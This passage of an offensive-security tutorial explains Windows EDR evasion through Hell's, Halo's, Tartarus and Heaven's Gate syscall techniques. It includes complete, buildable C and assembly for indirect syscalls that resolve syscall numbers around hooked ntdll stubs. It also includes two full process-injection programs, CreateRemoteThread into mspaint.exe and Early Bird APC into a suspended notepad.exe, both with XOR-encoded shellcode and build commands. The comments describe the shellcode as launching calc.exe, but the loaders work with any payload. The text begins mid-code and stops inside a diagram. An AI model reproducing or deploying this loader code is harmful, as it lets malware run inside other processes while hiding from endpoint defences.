            GetFunctionSize( GetProcAddress( ntdll, "NtAllocateVirtualMemory" ) ) );

    for ( int i = 0; i < 5; i++ ) {
        PBYTE pFunc = ( PBYTE ) GetProcAddress( ntdll, funcs[ i ] );
        WORD  ssn   = GetSSN( pFunc );
        printf( "[+] %-32s @ %p  SSN = 0x%02X (%u)\n", funcs[ i ], pFunc, ssn, ssn );
    }
}
```

`syscalls.S`:

```c
.intel_syntax noprefix

.global SysNtAllocateVirtualMemory
.global SysNtWriteVirtualMemory
.global SysNtProtectVirtualMemory
.global SysNtQueueApcThread
.global SysNtResumeThread

// SSN globals: written by resolve_hells_gate() at startup
// Using .long (32-bit) since SSNs fit in a DWORD
.data
.global g_NtAllocSsn
.global g_NtWriteSsn
.global g_NtProtectSsn
.global g_NtQueueApcSsn
.global g_NtResumeSsn

g_NtAllocSsn:    .long 0
g_NtWriteSsn:    .long 0
g_NtProtectSsn:  .long 0
g_NtQueueApcSsn: .long 0
g_NtResumeSsn:   .long 0

// Gadget address globals: func+0x12 inside ntdll, where syscall instruction lives
.global g_NtAllocAddr
.global g_NtWriteAddr
.global g_NtProtectAddr
.global g_NtQueueApcAddr
.global g_NtResumeAddr

g_NtAllocAddr:    .quad 0
g_NtWriteAddr:    .quad 0
g_NtProtectAddr:  .quad 0
g_NtQueueApcAddr: .quad 0
g_NtResumeAddr:   .quad 0

.text

// Each stub:
//   1. mov r10, rcx          -- Windows x64 syscall ABI requires first arg in r10
//   2. mov eax, [SSN global] -- Hell's Gate: SSN read from memory, resolved at runtime
//   3. jmp [gadget addr]     -- indirect syscall: fires from inside ntdll, not our binary
//
// No ret needed; ntdll's own ret instruction returns us to the C caller.

SysNtAllocateVirtualMemory:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtAllocSsn]
    jmp     qword ptr [rip + g_NtAllocAddr]

SysNtWriteVirtualMemory:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtWriteSsn]
    jmp     qword ptr [rip + g_NtWriteAddr]

SysNtProtectVirtualMemory:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtProtectSsn]
    jmp     qword ptr [rip + g_NtProtectAddr]

SysNtQueueApcThread:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtQueueApcSsn]
    jmp     qword ptr [rip + g_NtQueueApcAddr]

SysNtResumeThread:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtResumeSsn]
    jmp     qword ptr [rip + g_NtResumeAddr]
```

`halos_gate.h`:

```c
#pragma once
#include <windows.h>
#include <stdio.h>

// Credit: original implementation by @C5pider, Havoc Framework / Demon implant

// globals defined in syscalls.S
extern DWORD     g_NtAllocSsn;
extern DWORD     g_NtWriteSsn;
extern DWORD     g_NtProtectSsn;
extern DWORD     g_NtQueueApcSsn;
extern DWORD     g_NtResumeSsn;

extern ULONG_PTR g_NtAllocAddr;
extern ULONG_PTR g_NtWriteAddr;
extern ULONG_PTR g_NtProtectAddr;
extern ULONG_PTR g_NtQueueApcAddr;
extern ULONG_PTR g_NtResumeAddr;

static BOOLEAN GetSSNInternal( PBYTE NtFunction, PWORD SSN )
{
    DWORD Offset  = 0;
    BYTE  SSNLow  = 0;
    BYTE  SSNHigh = 0;

    if ( !SSN )
        return FALSE;

    do {
        if ( *( NtFunction + Offset ) == 0xC3 )
            break;

        if ( *( NtFunction + Offset + 0 ) == 0x4C &&
             *( NtFunction + Offset + 1 ) == 0x8B &&
             *( NtFunction + Offset + 2 ) == 0xD1 &&
             *( NtFunction + Offset + 3 ) == 0xB8 )
        {
            SSNLow  = *( NtFunction + Offset + 4 );
            SSNHigh = *( NtFunction + Offset + 5 );
            *SSN    = ( SSNHigh << 8 ) | SSNLow;
            return TRUE;
        }
        Offset++;
    } while ( TRUE );

    return FALSE;
}

static DWORD GetFunctionSize( PVOID Function )
{
    PBYTE                   Module           = ( PBYTE ) GetModuleHandleA( "ntdll.dll" );
    PIMAGE_NT_HEADERS       NtHeader         = ( PIMAGE_NT_HEADERS )( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = ( PIMAGE_EXPORT_DIRECTORY )( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    SIZE_T                  ExpDirectorySize = NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
    PDWORD                  AddrOfFunctions  = ( PDWORD )( Module + ExpDirectory->AddressOfFunctions );
    PDWORD                  AddrOfNames      = ( PDWORD )( Module + ExpDirectory->AddressOfNames );
    PWORD                   AddrOfOrdinals   = ( PWORD  )( Module + ExpDirectory->AddressOfNameOrdinals );
    PVOID                   FunctionAddr     = NULL;
    PCHAR                   FunctionName     = NULL;
    PBYTE                   Addr1            = NULL;
    PBYTE                   Addr2            = NULL;
    DWORD                   SyscallSize      = 0;
    DWORD                   Offset           = 0;

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        if ( ( PBYTE ) FunctionAddr >= ( PBYTE ) ExpDirectory &&
             ( PBYTE ) FunctionAddr  < ( PBYTE ) ExpDirectory + ExpDirectorySize )
            continue;

        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
        if ( *( PWORD ) FunctionName != 0x775a )
            continue;

        if ( !Addr1 ) {
            Addr1 = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
            continue;
        }

        Addr2  = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
        Offset = Addr1 > Addr2 ? Addr1 - Addr2 : Addr2 - Addr1;

        if ( !SyscallSize || Offset < SyscallSize )
            SyscallSize = Offset;
    }

    return SyscallSize;
}

static WORD GetSSN( PBYTE NtFunction )
{
    WORD   SSN       = 0;
    DWORD  Counter   = 0;
    DWORD  SzNtApi   = 0;
    PVOID  Neighbour = NULL;

    if ( GetSSNInternal( NtFunction, &SSN ) )
        return SSN;

    SzNtApi = GetFunctionSize( NtFunction );

    while ( SSN == 0 && Counter < 200 ) {
        Neighbour = NtFunction + ( SzNtApi * Counter );
        if ( GetSSNInternal( Neighbour, &SSN ) ) { SSN -= Counter; break; }

        Neighbour = NtFunction - ( SzNtApi * Counter );
        if ( GetSSNInternal( Neighbour, &SSN ) ) { SSN += Counter; break; }

        Counter++;
    }

    return SSN;
}

// Populate all SSN and indirect syscall gadget globals.
// SSNs: resolved via Halo's Gate (walks neighbors if stub is hooked).
// Addrs: func+0x12 inside ntdll where the syscall instruction lives.
static int resolve_halos_gate( void )
{
    HMODULE ntdll = GetModuleHandleA( "ntdll.dll" );
    PBYTE   p     = NULL;

    #define RESOLVE( name, ssn_g, addr_g ) \
        p = ( PBYTE ) GetProcAddress( ntdll, (name) ); \
        ssn_g  = ( DWORD ) GetSSN( p ); \
        addr_g = ( ULONG_PTR ) p + 0x12; \
        printf( "[*] %-32s SSN=0x%02X  gadget=%p\n", name, ssn_g, ( void* ) addr_g )

    RESOLVE( "NtAllocateVirtualMemory", g_NtAllocSsn,    g_NtAllocAddr    );
    RESOLVE( "NtWriteVirtualMemory",    g_NtWriteSsn,     g_NtWriteAddr    );
    RESOLVE( "NtProtectVirtualMemory",  g_NtProtectSsn,   g_NtProtectAddr  );
    RESOLVE( "NtQueueApcThread",        g_NtQueueApcSsn,  g_NtQueueApcAddr );
    RESOLVE( "NtResumeThread",          g_NtResumeSsn,    g_NtResumeAddr   );

    #undef RESOLVE
    return 0;
}
```

`CreateRemoteThread`:

```c
// CreateRemoteThread injection
// SSN resolution: Halo's Gate (C5pider) -- walks neighbors if stub is hooked
// Syscall execution: indirect (jumps to ntdll's syscall gadget, clean call stack)
// Memory: RW alloc -> write -> RW->RX flip -> CreateRemoteThread
// Shellcode: multi-byte XOR encoded at rest, decoded into heap before injection
//
// Build:
//   x86_64-w64-mingw32-gcc syscalls.S CreateRemoteThread.c -o crt_inject.exe

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "halos_gate.h"

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

extern NTSTATUS SysNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS SysNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

// calc.exe shellcode (windows/x64/exec CMD=calc.exe, 276 bytes)
// XOR-encoded with key {0xDE, 0xAD, 0xBE, 0xEF}
static unsigned char sc_enc[] = {
    0x22,0xe5,0x3d,0x0b,0x2e,0x45,0x7e,0xef,0xde,0xad,0xff,0xbe,0x9f,0xfd,
    0xec,0xbe,0x88,0xe5,0x8f,0x3d,0xbb,0xe5,0x35,0xbd,0xbe,0xe5,0x35,0xbd,
    0xc6,0xe5,0x35,0xbd,0xfe,0xe5,0x35,0x9d,0x8e,0xe5,0xb1,0x58,0x94,0xe7,
    0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0x91,0xdf,0x93,0xdc,0x81,0x9e,0xae,
    0x1f,0x64,0xb3,0xae,0xdf,0x6c,0x5c,0x02,0x8c,0xec,0xef,0xa7,0x55,0xff,
    0x9e,0x64,0x9c,0x91,0xf6,0xee,0x0e,0x26,0x3e,0x67,0xde,0xad,0xbe,0xa7,
    0x5b,0x6d,0xca,0x88,0x96,0xac,0x6e,0xbf,0x55,0xe5,0xa6,0xab,0x55,0xed,
    0x9e,0xa6,0xdf,0x7d,0x5d,0xb9,0x96,0x52,0x77,0xae,0x55,0x99,0x36,0xa7,
    0xdf,0x7b,0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0xec,0x7f,0x26,0xd3,0xec,
    0xbf,0x2e,0xe6,0x4d,0xcb,0x1e,0x92,0xae,0xf2,0xcb,0xd6,0xe8,0x87,0x3e,
    0xab,0x75,0xe6,0xab,0x55,0xed,0x9a,0xa6,0xdf,0x7d,0xd8,0xae,0x55,0xa1,
    0xf6,0xab,0x55,0xed,0xa2,0xa6,0xdf,0x7d,0xff,0x64,0xda,0x25,0xf6,0xee,
    0x0e,0xec,0xe6,0xae,0x86,0xf3,0xe7,0xb5,0x9f,0xf5,0xff,0xb6,0x9f,0xf7,
    0xf6,0x6c,0x32,0x8d,0xff,0xbd,0x21,0x4d,0xe6,0xae,0x87,0xf7,0xf6,0x64,
    0xcc,0x44,0xe9,0x10,0x21,0x52,0xe3,0xa7,0x64,0xac,0xbe,0xef,0xde,0xad,
    0xbe,0xef,0xde,0xe5,0x33,0x62,0xdf,0xac,0xbe,0xef,0x9f,0x17,0x8f,0x64,
    0xb1,0x2a,0x41,0x3a,0x65,0x5d,0x0b,0x4d,0x88,0xec,0x04,0x49,0x4b,0x10,
    0x23,0x10,0x0b,0xe5,0x3d,0x2b,0xf6,0x91,0xb8,0x93,0xd4,0x2d,0x45,0x0f,
    0xab,0xa8,0x05,0xa8,0xcd,0xdf,0xd1,0x85,0xde,0xf4,0xff,0x66,0x04,0x52,
    0x6b,0x8c,0xbf,0xc1,0xdd,0xc1,0xbb,0xd5,0xdb,0xef,
};

static const unsigned char xor_key[] = {0xDE, 0xAD, 0xBE, 0xEF};

static void xor_decode(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= xor_key[i % sizeof(xor_key)];
}

static DWORD pid_by_name(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main(void) {
    // resolve SSNs via Halo's Gate and gadget addresses for indirect jump
    if (resolve_halos_gate() != 0) return 1;
    printf("\n");

    DWORD pid = pid_by_name("mspaint.exe");
    if (!pid) { printf("[-] mspaint.exe not found\n"); return 1; }
    printf("[*] Target PID: %lu\n", pid);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess: %lu\n", GetLastError()); return 1; }

    unsigned char *decoded = (unsigned char *)malloc(sizeof(sc_enc));
    memcpy(decoded, sc_enc, sizeof(sc_enc));
    xor_decode(decoded, sizeof(sc_enc));

    PVOID  buf  = NULL;
    SIZE_T size = sizeof(sc_enc);

    NTSTATUS st = SysNtAllocateVirtualMemory(
        hProc, &buf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!NT_SUCCESS(st)) { printf("[-] NtAllocateVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Remote buffer: %p (%zu bytes)\n", buf, size);

    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(hProc, buf, decoded, sizeof(sc_enc), &written);
    free(decoded);
    if (!NT_SUCCESS(st)) { printf("[-] NtWriteVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Wrote %zu bytes\n", written);

    ULONG  old_prot      = 0;
    SIZE_T protect_size  = sizeof(sc_enc);
    st = SysNtProtectVirtualMemory(hProc, &buf, &protect_size, PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(st)) { printf("[-] NtProtectVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Protection: RW -> RX (was 0x%lX)\n", old_prot);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    if (!hThread) { printf("[-] CreateRemoteThread: %lu\n", GetLastError()); return 1; }
    printf("[+] Thread: %p\n", hThread);

    WaitForSingleObject(hThread, 4000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

`EarlyBird.c`:

```c
// Early Bird APC injection
// SSN resolution: Halo's Gate (C5pider) -- walks neighbors if stub is hooked
// Syscall execution: indirect (jumps to ntdll's syscall gadget, clean call stack)
// Flow: spawn suspended -> RW alloc -> write -> RW->RX flip -> queue APC -> resume
// Shellcode: multi-byte XOR encoded at rest, decoded into heap before injection
//
// Build:
//   x86_64-w64-mingw32-gcc syscalls.S EarlyBird.c -o earlybird.exe

#include <windows.h>
#include <stdio.h>
#include "halos_gate.h"

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

extern NTSTATUS SysNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS SysNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

extern NTSTATUS SysNtQueueApcThread(
    HANDLE ThreadHandle,
    PVOID  ApcRoutine,
    PVOID  ApcArgument1,
    PVOID  ApcArgument2,
    PVOID  ApcArgument3
);

extern NTSTATUS SysNtResumeThread(
    HANDLE  ThreadHandle,
    PULONG  PreviousSuspendCount
);

// calc.exe shellcode (windows/x64/exec CMD=calc.exe, 276 bytes)
// XOR-encoded with key {0xDE, 0xAD, 0xBE, 0xEF}
static unsigned char sc_enc[] = {
    0x22,0xe5,0x3d,0x0b,0x2e,0x45,0x7e,0xef,0xde,0xad,0xff,0xbe,0x9f,0xfd,
    0xec,0xbe,0x88,0xe5,0x8f,0x3d,0xbb,0xe5,0x35,0xbd,0xbe,0xe5,0x35,0xbd,
    0xc6,0xe5,0x35,0xbd,0xfe,0xe5,0x35,0x9d,0x8e,0xe5,0xb1,0x58,0x94,0xe7,
    0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0x91,0xdf,0x93,0xdc,0x81,0x9e,0xae,
    0x1f,0x64,0xb3,0xae,0xdf,0x6c,0x5c,0x02,0x8c,0xec,0xef,0xa7,0x55,0xff,
    0x9e,0x64,0x9c,0x91,0xf6,0xee,0x0e,0x26,0x3e,0x67,0xde,0xad,0xbe,0xa7,
    0x5b,0x6d,0xca,0x88,0x96,0xac,0x6e,0xbf,0x55,0xe5,0xa6,0xab,0x55,0xed,
    0x9e,0xa6,0xdf,0x7d,0x5d,0xb9,0x96,0x52,0x77,0xae,0x55,0x99,0x36,0xa7,
    0xdf,0x7b,0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0xec,0x7f,0x26,0xd3,0xec,
    0xbf,0x2e,0xe6,0x4d,0xcb,0x1e,0x92,0xae,0xf2,0xcb,0xd6,0xe8,0x87,0x3e,
    0xab,0x75,0xe6,0xab,0x55,0xed,0x9a,0xa6,0xdf,0x7d,0xd8,0xae,0x55,0xa1,
    0xf6,0xab,0x55,0xed,0xa2,0xa6,0xdf,0x7d,0xff,0x64,0xda,0x25,0xf6,0xee,
    0x0e,0xec,0xe6,0xae,0x86,0xf3,0xe7,0xb5,0x9f,0xf5,0xff,0xb6,0x9f,0xf7,
    0xf6,0x6c,0x32,0x8d,0xff,0xbd,0x21,0x4d,0xe6,0xae,0x87,0xf7,0xf6,0x64,
    0xcc,0x44,0xe9,0x10,0x21,0x52,0xe3,0xa7,0x64,0xac,0xbe,0xef,0xde,0xad,
    0xbe,0xef,0xde,0xe5,0x33,0x62,0xdf,0xac,0xbe,0xef,0x9f,0x17,0x8f,0x64,
    0xb1,0x2a,0x41,0x3a,0x65,0x5d,0x0b,0x4d,0x88,0xec,0x04,0x49,0x4b,0x10,
    0x23,0x10,0x0b,0xe5,0x3d,0x2b,0xf6,0x91,0xb8,0x93,0xd4,0x2d,0x45,0x0f,
    0xab,0xa8,0x05,0xa8,0xcd,0xdf,0xd1,0x85,0xde,0xf4,0xff,0x66,0x04,0x52,
    0x6b,0x8c,0xbf,0xc1,0xdd,0xc1,0xbb,0xd5,0xdb,0xef,
};

static const unsigned char xor_key[] = {0xDE, 0xAD, 0xBE, 0xEF};

static void xor_decode(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= xor_key[i % sizeof(xor_key)];
}

int main(void) {
    // resolve SSNs via Halo's Gate and gadget addresses for indirect jump
    if (resolve_halos_gate() != 0) return 1;
    printf("\n");

    STARTUPINFOA        si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED,
            NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] PID %lu TID %lu (suspended)\n", pi.dwProcessId, pi.dwThreadId);

    unsigned char *decoded = (unsigned char *)malloc(sizeof(sc_enc));
    memcpy(decoded, sc_enc, sizeof(sc_enc));
    xor_decode(decoded, sizeof(sc_enc));

    PVOID  buf  = NULL;
    SIZE_T size = sizeof(sc_enc);

    NTSTATUS st = SysNtAllocateVirtualMemory(
        pi.hProcess, &buf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!NT_SUCCESS(st)) { printf("[-] NtAllocateVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Remote buffer: %p\n", buf);

    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(pi.hProcess, buf, decoded, sizeof(sc_enc), &written);
    free(decoded);
    if (!NT_SUCCESS(st)) { printf("[-] NtWriteVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Wrote %zu bytes\n", written);

    ULONG  old_prot     = 0;
    SIZE_T protect_size = sizeof(sc_enc);
    st = SysNtProtectVirtualMemory(pi.hProcess, &buf, &protect_size, PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(st)) { printf("[-] NtProtectVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Protection: RW -> RX (was 0x%lX)\n", old_prot);

    // Queue APC to the suspended main thread.
    // Thread enters alertable wait before the entry point, so APC fires first.
    // Shellcode runs before any process code, before EDR hooks load in the target.
    st = SysNtQueueApcThread(pi.hThread, buf, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) { printf("[-] NtQueueApcThread: 0x%lX\n", st); goto fail; }
    printf("[+] APC queued at %p\n", buf);

    ULONG prev = 0;
    st = SysNtResumeThread(pi.hThread, &prev);
    if (!NT_SUCCESS(st)) { printf("[-] NtResumeThread: 0x%lX\n", st); goto fail; }
    printf("[+] Resumed (prev suspend count: %lu)\n", prev);

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;

fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}
```
## Tartarus Gate

So Halo's gate solved the hooked stub problem by walking to it's neighbor. But it has one assumption that a clean neighbor contains standard stub pattern starting with `4C 8B D1 B8`. What will happen when a neighbor stub exists and is not hooked by EDR but also doesn't start with `4C 8B D1 B8`. This is what Tartarus Gate solves.

On some Windows version and configurations, certain `Nt*` stubs use `int 2E` instead of `syscall` for kernel transition:

```c
+0x00  4C 8B D1           mov  r10, rcx
+0x03  B8 18 00 00 00     mov  eax, 0x18
+0x08  F6 04 25 ...       test byte ptr
+0x10  75 03              jne
+0x12  0F 05              syscall       <- normal stub
+0x14  C3                 ret
```

and then

```c
+0x00  4C 8B D1           mov  r10, rcx
+0x03  B8 18 00 00 00     mov  eax, 0x18
+0x08  F6 04 25 ...       test byte ptr
+0x10  75 03              jne
+0x12  CD 2E              int 2E        <- alternate stub
+0x14  C3                 ret
```

The SSN is still at `+0x04` in both cases that part is identical. The difference is only at `+0x12`. Both stub types are perfectly valid and unhooked. Hell's Gate and Halo's Gate check for `4C 8B D1 B8` at `+0x00` which passes for both so actually reading the SSN works fine for both variants. So what does Tartarus Gate actually solve ?

Well, when Halo's Gate walks neighbors looking for a clean stub it checks:

```c
if (*(BYTE*)(above + 0x03) == 0xB8)
```

That check passes for both `syscall` and `int 2E` stubs since both have `B8` at `+0x03`. So the SSN is readable either way. The actual issue Tartarus Gate solve is more subtle, it handles the case where the neighbor stub is also hooked, but hooked in a different way. So what does that even mean, lets understand it.

Some EDRs don't overwrite `+0x00` with `E9` (jmp) instead they patch deeper into the sub, for example overwriting the test instruction at `+0x08` or `jne` at `+0x10`. In that case `+0x00` still shows `4C 8B D1` and `+0x03` still shows `B8`, so our check passes but the SSN we read is garbage because the bytes got shifted by the hook. 

Tartarus Gate adds an addition check, it verifies the stub is truly clean by also checking that `+0x12` contains either `0F 05` (syscall) or `CD 2E`  (int 2E):

```c
BOOL is_clean_stub(ULONG_PTR p) {
    // check standard prologue
    if (*(BYTE*)(p + 0x00) != 0x4C) return FALSE;
    if (*(BYTE*)(p + 0x01) != 0x8B) return FALSE;
    if (*(BYTE*)(p + 0x02) != 0xD1) return FALSE;
    if (*(BYTE*)(p + 0x03) != 0xB8) return FALSE;

    // check syscall or int 2E at +0x12
    if (*(BYTE*)(p + 0x12) == 0x0F && *(BYTE*)(p + 0x13) == 0x05)
        return TRUE;   // syscall stub
    if (*(BYTE*)(p + 0x12) == 0xCD && *(BYTE*)(p + 0x13) == 0x2E)
        return TRUE;   // int 2E stub

    return FALSE;      // something else, possibly partially hooked
}
```

This is a much stronger check. A stub only passes if both the prologue AND the syscall instruction are intact. A partially hooked stub that preserved `4C 8B D1 B8` but corrupted the middle bytes will fail at the `+0x12` check. Noticed that codes be getting shitty long so just check from this [snippet](https://github.com/At0mXploit/Syscalls-Demystified) at Github.
## Heaven's Gate

This is a more older technique which first appeared around 2009. It allows 32-bit malware running on 64-bit systems to hide API calls by switching to a 64-bit execution environment. The trick exploits **WoW64** the Windows subsystem that lets 32-bit processes run on 64-bit Windows.

**WOW64 (Windows 32-bit On Windows 64-bit)** is a compatibility layer that lets 32-bit processes run on a 64-bit Windows system. When you compile your program as x86 (32-bit) and run it on Windows x64, it runs inside WOW64. A WOW64 process has two ntdlls loaded simultaneously:

```bash
C:\Windows\SysWOW64\ntdll.dll   = 32-bit, used by your 32-bit code
C:\Windows\System32\ntdll.dll   = 64-bit, used internally by WOW64 layer
```

When your 32-bit code calls `NtAllocateVirtualMemory`, the flow is:

<svg width="100%" viewBox="0 0 680 520" role="img">
<title>WOW64 normal syscall flow</title>
<desc>Shows how a 32-bit process issues a syscall through the full WOW64 translation layer</desc>
<defs>
<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
<path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
</marker>
</defs>

<!-- 32-bit process label -->
<rect x="40" y="20" width="600" height="440" rx="10" fill="#111" stroke="#333" stroke-width="1"/>
<text font-family="monospace" font-size="12" font-weight="600" fill="#888" x="56" y="44">32-bit process (WOW64)</text>

<!-- Step 1 - your code -->
<rect x="220" y="58" width="240" height="52" rx="6" fill="#1e1e2e" stroke="#444" stroke-width="1"/>
<text font-family="monospace" font-size="12" font-weight="600" fill="white" x="340" y="79" text-anchor="middle">your 32-bit code</text>
<text font-family="monospace" font-size="10" fill="#aaa" x="340" y="97" text-anchor="middle">calls NtAllocateVirtualMemory</text>

<!-- EDR hook warning 1 -->
<rect x="476" y="63" width="140" height="28" rx="4" fill="#3a1a1a" stroke="#7a2a2a" stroke-width="0.5"/>
<text font-family="monospace" font-size="9" fill="#ff8888" x="546" y="82" text-anchor="middle">EDR hook possible</text>
<line x1="460" y1="77" x2="478" y2="77" stroke="#7a2a2a" stroke-width="0.5" stroke-dasharray="3 2"/>

<line x1="340" y1="110" x2="340" y2="136" stroke="#555" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- Step 2 - SysWOW64 ntdll -->
<rect x="180" y="138" width="320" height="52" rx="6" fill="#1e2a1e" stroke="#2a5a2a" stroke-width="1"/>
<text font-family="monospace" font-size="12" font-weight="600" fill="white" x="340" y="159" text-anchor="middle">SysWOW64\ntdll.dll</text>
<text font-family="monospace" font-size="10" fill="#9fe1cb" x="340" y="177" text-anchor="middle">32-bit stub — mov eax, SSN — call edx</text>

<!-- EDR hook warning 2 -->
<rect x="476" y="148" width="140" height="28" rx="4" fill="#3a1a1a" stroke="#7a2a2a" stroke-width="0.5"/>
<text font-family="monospace" font-size="9" fill="#ff8888" x="546" y="167" text-anchor="middle">EDR hook possible</text>
<line x1="460" y1="162" x2="478" y2="162" stroke="#7a2a2a" stroke-width="0.5" stroke-dasharray="3 2"/>

<line x1="340" y1="190" x2="340" y2="216" stroke="#555" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- Step 3 - wow64.dll -->
<rect x="180" y="218" width="320" height="52" rx="6" fill="#1e1e2e" stroke="#3a3a6a" stroke-width="1"/>
<text font-family="monospace" font-size="12" font-weight="600" fill="white" x="340" y="239" text-anchor="middle">wow64.dll</text>
<text font-family="monospace" font-size="10" fill="#aaaaff" x="340" y="257" text-anchor="middle">translates 32-bit args to 64-bit</text>

<!-- EDR hook warning 3 -->
<rect x="476" y="228" width="140" height="28" rx="4" fill="#3a1a1a" stroke="#7a2a2a" stroke-width="0.5"/>
<text font-family="monospace" font-size="9" fill="#ff8888" x="546" y="247" text-anchor="middle">EDR hook possible</text>
<line x1="460" y1="242" x2="478" y2="242" stroke="#7a2a2a" stroke-width="0.5" stroke-dasharray="3 2"/>

<line x1="340" y1="270" x2="340" y2="296" stroke="#555" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- Step 4 - wow64cpu.dll -->
<rect x="180" y="298" width="320" height="52" rx="6" fill="#2a1e2a" stroke="#5a3a5a" stroke-width="1"/>
<text font-family="monospace" font-size="12" font-weight="600" fill="white" x="340" y="319" text-anchor="middle">wow64cpu.dll</text>
<text font-family="monospace" font-size="10" fill="#ddaaff" x="340" y="337" text-anchor="middle">far call 0x33 — switches CPU to 64-bit mode</text>

<line x1="340" y1="350" x2="340" y2="376" stroke="#555" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- Step 5 - System32 ntdll -->
<rect x="180" y="378" width="320" height="52" rx="6" fill="#1e2a1e" stroke="#2a5a2a" stroke-width="1"/>
<text font-family="monospace" font-size="12" font-weight="600" fill="white" x="340" y="399" text-anchor="middle">System32\ntdll.dll</text>
<text font-family="monospace" font-size="10" fill="#9fe1cb" x="340" y="417" text-anchor="middle">64-bit stub — syscall at +0x12 — kernel</text>

<!-- EDR hook warning 4 -->
<rect x="476" y="388" width="140" height="28" rx="4" fill="#3a1a1a" stroke="#7a2a2a" stroke-width="0.5"/>
<text font-family="monospace" font-size="9" fill="#ff8888" x="546" y="407" text-anchor="middle">EDR hook possible</text>
<line x1="460" y1="402" x2="478" y2="402" stroke="#7a2a2a" stroke-width="0.5" stroke-dasharray="3 2"/>

<line x1="340" y1="430" x2="340" y2="452" stroke="#cc4444" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- kernel -->
<rect x="220" y="454" width="240" height="38" rx="6" fill="#2a2a2a" stroke="#555" stroke-width="1"/>
